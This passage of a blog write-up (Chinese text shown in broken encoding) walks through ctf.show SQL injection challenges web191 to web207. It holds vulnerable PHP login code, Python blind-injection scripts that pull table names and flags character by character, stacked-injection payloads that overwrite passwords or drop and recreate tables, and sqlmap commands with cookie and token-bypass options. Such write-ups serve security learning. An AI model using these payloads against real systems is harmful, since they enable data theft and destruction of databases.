class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;8bef&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            r = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = mid</span><br></pre></td></tr></table></figure><h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯†ç æ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·åéæ³•&#x27;</span>;</span><br><span class="line">      <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>ascii</code>è¢«ç¦ç”¨äº†ï¼Œæ”¹ç”¨<code>ord</code>å°±å¥½äº†</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line">import threading</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ff11f70e-c0c6-4a92-8f4e-5c532108b4fa.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="title function_ invoke__">chr</span>(mid)</span><br><span class="line">            <span class="keyword">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and (ord(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_fl0g,ctfshow_user</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and (ord(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,f1ag</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and (ord(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;18873d0a-9f29-4595-99a5-cff10326c9f2&#125;</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:f<span class="string">&quot;admin&#x27;and (ord(substr((select group_concat(f1ag)from ctfshow_fl0g),&#123;i&#125;,1))&lt;&#123;mid&#125;)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.<span class="title function_ invoke__">post</span>(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;8bef&#x27;</span> in response.text:</span><br><span class="line">            r = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = mid</span><br></pre></td></tr></table></figure><h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·åéæ³•&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨å­—ç¬¦å°±å¥½ï¼Œè®°å¾—å¾—åˆ°çš„ç»“æœè¦è½¬å°å†™</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://67bbafbb-f32e-4e33-bc12-b1281048ea86.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(substr((select database()),&#123;i&#125;,1)=&#x27;&#123;chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_fl0g,ctfshow_user</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1)=&#x27;&#123;chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,f1ag</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1)=&#x27;&#123;chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># CTFSHOW&#123;3AD5D88C-7A43-4D0E-99A2-AC23D5ED9749&#125;</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;admin&#x27;and if(substr((select group_concat(f1ag)from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(j)&#125;</span>&#x27;,1,0)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;8bef&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><p><code>substr</code>è¢«ç¦ç”¨ï¼Œä½¿ç”¨<code>left</code>ä»£æ›¿ï¼ˆæ³¨æ„è¡¨åå˜äº†ï¼Œè¿˜æœ‰ç»“æœè®°å¾—å°å†™ï¼‰ï¼Œ<code>web193</code>å’Œ<code>web194</code>ä¹Ÿå¯ä»¥ç”¨<code>mid</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a68f5cff-2cf6-4627-99ec-df3b012a8531.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(left((select database()),&#123;i&#125;)=&#x27;&#123;flag+chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flxg,ctfshow_user</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(left((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;)=&#x27;&#123;flag+chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,f1ag</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(left((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;i&#125;)=&#x27;&#123;flag+chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># CTFSHOW&#123;ECF80221-1B4B-40A3-8AED-A1D11B0E1555&#125;</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;admin&#x27;and if(left((select group_concat(f1ag)from ctfshow_flxg),<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;flag+<span class="built_in">chr</span>(j)&#125;</span>&#x27;,1,0)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;8bef&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><p>ä½¿ç”¨<code>lpad</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8264940f-695b-406b-8033-9051e766a595.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(lpad((select database()),&#123;i&#125;,&#x27;&#x27;)=&#x27;&#123;flag+chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flxg,ctfshow_user</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(lpad((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,&#x27;&#x27;)=&#x27;&#123;flag+chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,f1ag</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(lpad((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;i&#125;,&#x27;&#x27;)=&#x27;&#123;flag+chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;ecda663f-20f8-4743-b573-4fe3c2038239&#125;</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;admin&#x27;and if(lpad((select group_concat(f1ag)from ctfshow_flxg),<span class="subst">&#123;i&#125;</span>,&#x27;&#x27;)=&#x27;<span class="subst">&#123;flag+<span class="built_in">chr</span>(j)&#125;</span>&#x27;,1,0)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;8bef&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># print(flag.lower())</span></span><br></pre></td></tr></table></figure><h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯†ç æ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·åéæ³•&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;ç™»é™†æˆåŠŸ flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ç¦ç”¨<code>;</code>ï¼Œå¯ä»¥è€ƒè™‘å †å æ³¨å…¥ï¼Œä½†æ˜¯ç”±äºå¾ˆå¤šæŸ¥è¯¢å­—ç¬¦è¢«<code>ban</code>äº†ï¼Œæ‰€ä»¥è€ƒè™‘ä¿®æ”¹è¡¨</p><p>ç¬¬ä¸€ç§æ–¹æ³•å¯ä»¥åªä¿®æ”¹å¯†ç ï¼Œç„¶åå¼±ç±»å‹åŒ¹é…ç”¨<code>0</code>ç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ä¿®æ”¹å¯†ç </span><br><span class="line">username=1;update(ctfshow_user)set`pass`=1;&amp;password=1</span><br><span class="line"># ç™»å½•</span><br><span class="line">username=0&amp;password=1</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥æŠŠç”¨æˆ·åä¹Ÿæ”¹äº†ï¼Œç„¶åç™»å½•ä¿®æ”¹åçš„ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1;update(ctfshow_user)set`username`=1&amp;password=1</span><br><span class="line">username=1&amp;password=1</span><br></pre></td></tr></table></figure><h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>ç›´æ¥ä½¿ç”¨ä»¥å‰æ³„éœ²çš„å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0&amp;password=passwordAUTO</span><br></pre></td></tr></table></figure><p>ç„¶ååå°å…¶å®æ²¡æœ‰ç¦ç”¨<code>select</code>ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é”™è¯¯<code>username</code>ä½¿å¾—ç¬¬ä¸€ä¸ªæŸ¥è¯¢ä¸ºç©ºï¼Œç„¶åå †å ä¸€ä¸ªè¯­å¥ä½¿å…¶è¾“å‡ºä¸ºå¯†ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1;select(2);&amp;password=2</span><br></pre></td></tr></table></figure><h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><p>å¯ä»¥ç›´æ¥ç”¨ä¸Šä¸€å…³æ–¹æ³•ï¼Œä¸è¿‡<code>select</code>çœŸçš„è¢«ç¦ç”¨äº†è¿™æ¬¡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1;show tables;&amp;password=ctfshow_user</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æŠŠåŸæ¥è¡¨åˆ é™¤å»ºä¸ªæ–°è¡¨ï¼Œç„¶åæ·»åŠ è‡ªå®šä¹‰ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1;drop table ctfshow_user;create table ctfshow_user(`username` varchar(100),`pass` varchar(100));insert ctfshow_user(`username`,`pass`) value(1,2)&amp;password=ctfshow_user</span><br><span class="line"></span><br><span class="line">username=1&amp;password=2</span><br></pre></td></tr></table></figure><h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><p>ä¸Šä¸€å…³æ–¹æ³•æ¥ç€ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1;show tables;&amp;password=ctfshow_user</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨å·²ç»æ³„éœ²çš„ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0&amp;password=passwordAUTO</span><br></pre></td></tr></table></figure><p>ç„¶åå¦‚æœä¸çŸ¥é“å¯†ç ä½†å·²çŸ¥æœ‰ä¸€ä¸ªç”¨æˆ·æ˜¯<code>userAUTO</code>ä¹Ÿå¯ä»¥äº’æ¢è¡¨çš„ç”¨æˆ·åå’Œå¯†ç åˆ—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0;alter table ctfshow_user change `username` `pass2` varchar(100);alter table ctfshow_user change `pass` `username` varchar(100);alter table ctfshow_user change `pass2` `pass` varchar(100);&amp;password=1</span><br><span class="line"></span><br><span class="line">username=0&amp;password=userAUTO</span><br></pre></td></tr></table></figure><h2 id="web199-200"><a href="#web199-200" class="headerlink" title="web199-200"></a>web199-200</h2><p>ä¸Šä¸€å…³æ–¹æ³•æ¥ç€ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1;show tables;&amp;password=ctfshow_user</span><br></pre></td></tr></table></figure><p>å·²ç»æ³„éœ²çš„ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0&amp;password=passwordAUTO</span><br></pre></td></tr></table></figure><p>æ‹¬å·è¢«ç¦ç”¨äº†ï¼Œå¯ä»¥ä½¿ç”¨<code>text</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0;alter table ctfshow_user change `username` `pass2` text;alter table ctfshow_user change `pass` `username` text;alter table ctfshow_user change `pass2` `pass` text;&amp;password=1</span><br><span class="line"></span><br><span class="line">username=0&amp;password=userAUTO</span><br></pre></td></tr></table></figure><h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><p>è¦æ±‚ä¸­</p><blockquote><p> ä½¿ç”¨â€“user-agent æŒ‡å®šagent</p><p> ä½¿ç”¨â€“referer ç»•è¿‡refereræ£€æŸ¥</p></blockquote><p>æŒ‡å®š<code>ua</code>å’Œ<code>ref</code>å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ‰¾åˆ°æ³¨å…¥ç‚¹</span><br><span class="line">python sqlmap.py -u &quot;http://cc8db124-5468-4443-9bc1-070ad3aaec8d.challenge.ctf.show/api/?id=1&amp;page=1&amp;limit=10&quot; --user-agent=sqlmap --referer=ctf.show</span><br><span class="line"># æŸ¥çœ‹æ•°æ®åº“ ctfshow_web</span><br><span class="line">python sqlmap.py -u &quot;http://cc8db124-5468-4443-9bc1-070ad3aaec8d.challenge.ctf.show/api/?id=1&amp;page=1&amp;limit=10&quot; --user-agent=sqlmap --referer=ctf.show --dbs</span><br><span class="line"># æŸ¥çœ‹è¡¨ ctfshow_user</span><br><span class="line">python sqlmap.py -u &quot;http://cc8db124-5468-4443-9bc1-070ad3aaec8d.challenge.ctf.show/api/?id=1&amp;page=1&amp;limit=10&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web --tables</span><br><span class="line"># æŸ¥çœ‹åˆ— id pass username</span><br><span class="line">python sqlmap.py -u &quot;http://cc8db124-5468-4443-9bc1-070ad3aaec8d.challenge.ctf.show/api/?id=1&amp;page=1&amp;limit=10&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user --columns</span><br><span class="line"># æŠŠpassç»™dumpä¸‹æ¥å³å¯æ‰¾åˆ°flag</span><br><span class="line">python sqlmap.py -u &quot;http://cc8db124-5468-4443-9bc1-070ad3aaec8d.challenge.ctf.show/api/?id=1&amp;page=1&amp;limit=10&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure><h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><p>æ”¹æˆ<code>POST</code>æ–¹å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://cc958326-ca9d-4132-88e3-60b614b797f3.challenge.ctf.show/api/index.php&quot; --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user -C pass --dump --batch</span><br></pre></td></tr></table></figure><h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>æ”¹æˆ<code>PUT</code>æ–¹æ³•å¹¶ä¸”è®°å¾—æ›´æ”¹<code>Content-Type</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://e33e4ae1-8bef-4b7d-b592-3db290684d23.challenge.ctf.show/api/index.php&quot; --method=PUT --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user -C pass --dump --batch --headers=&quot;Content-Type: text/plain&quot;</span><br></pre></td></tr></table></figure><h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><p>æ·»åŠ <code>Cookie</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://27d5c675-f147-45cb-b57f-2388cc19da3d.challenge.ctf.show/api/index.php&quot; --method=PUT --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user -C pass --dump --batch --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=e4n6k9ucq0aik0op9oc9ad1b3u;ctfshow=4410fbe56cd70245d52c57b405d569f2&quot;</span><br></pre></td></tr></table></figure><h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><p>é‰´æƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://50c5fc83-2892-4382-ab5f-59a827c78045.challenge.ctf.show/api/index.php&quot; --method=PUT --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user -C pass --dump --batch --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=e4n6k9ucq0aik0op9oc9ad1b3u;ctfshow=4410fbe56cd70245d52c57b405d569f2&quot; --safe-url=&quot;http://50c5fc83-2892-4382-ab5f-59a827c78045.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1</span><br></pre></td></tr></table></figure><h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><p>åŠ ä¸ªå‰ç¼€åç¼€å°±è¡Œï¼Œè®°å¾—è¡¨ååˆ—åå˜äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://e75a3848-836e-4ee1-a262-4573b3a8a34e.challenge.ctf.show/api/index.php&quot; --method=PUT --prefix=&quot;&#x27;)&quot; --suffix=&quot;#&quot; --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web --tables --dump --batch --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=c9v7srpall5anm0iu80j0uh3vr;ctfshow=4410fbe56cd70245d52c57b405d569f2;&quot; --safe-url=&quot;http://e75a3848-836e-4ee1-a262-4573b3a8a34e.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1</span><br></pre></td></tr></table></figure><h2 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h2><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½¿ç”¨<code>sqlmap</code>è‡ªå¸¦çš„<code>tamper</code>å³å¯</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://cc9fbf46-0256-48aa-8863-044662e4bac3.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--prefix</span>=<span 